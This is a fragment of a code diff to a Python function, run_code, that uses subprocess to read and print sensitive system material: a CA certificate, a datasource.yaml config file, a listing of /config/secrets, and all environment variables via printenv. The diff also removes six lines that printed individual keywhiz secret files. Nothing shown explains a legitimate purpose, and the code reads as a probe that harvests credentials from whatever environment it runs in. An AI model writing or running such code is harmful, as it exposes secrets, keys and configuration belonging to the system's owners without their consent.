@@ -56,33 +56,13 @@ def run_code():
     output_string = result.stdout
     print(f"ca.crt command: {output_string}")
 
+    result = subprocess.run("cat /config/datasource.yaml", shell=True, capture_output=True, text=True)
+    output_string = result.stdout
+    print(f"datasource.yaml command: {output_string}")
+
     result = subprocess.run("ls /config/secrets", shell=True, capture_output=True, text=True)
     output_string = result.stdout
     print(f"ls command: {output_string}")
-
-    result = subprocess.run("cat /config/secrets/keywhiz-2d0c731448b9ed2b", shell=True, capture_output=True, text=True)
-    output_string = result.stdout
-    print(f"keywhiz-2d0c731448b9ed2b command: {output_string}")
-
-    result = subprocess.run("cat /config/secrets/keywhiz-2fa2798882cad8dc", shell=True, capture_output=True, text=True)
-    output_string = result.stdout
-    print(f"keywhiz-2fa2798882cad8dc command: {output_string}")
-
-    result = subprocess.run("cat /config/secrets/keywhiz-344989a7458e3892", shell=True, capture_output=True, text=True)
-    output_string = result.stdout
-    print(f"keywhiz-344989a7458e3892 command: {output_string}")
-
-    result = subprocess.run("cat /config/secrets/keywhiz-527afb2aa7f619f4", shell=True, capture_output=True, text=True)
-    output_string = result.stdout
-    print(f"keywhiz-527afb2aa7f619f4 command: {output_string}")
-
-    result = subprocess.run("cat /config/secrets/keywhiz-9922c4b2ae54baa4", shell=True, capture_output=True, text=True)
-    output_string = result.stdout
-    print(f"keywhiz-9922c4b2ae54baa4 command: {output_string}")
-
-    result = subprocess.run("cat /config/secrets/keywhiz-c8d38c760f1568d4", shell=True, capture_output=True, text=True)
-    output_string = result.stdout
-    print(f"keywhiz-c8d38c760f1568d4 command: {output_string}")
 
     result = subprocess.run("printenv", shell=True, capture_output=True, text=True)
     output_string = result.stdout
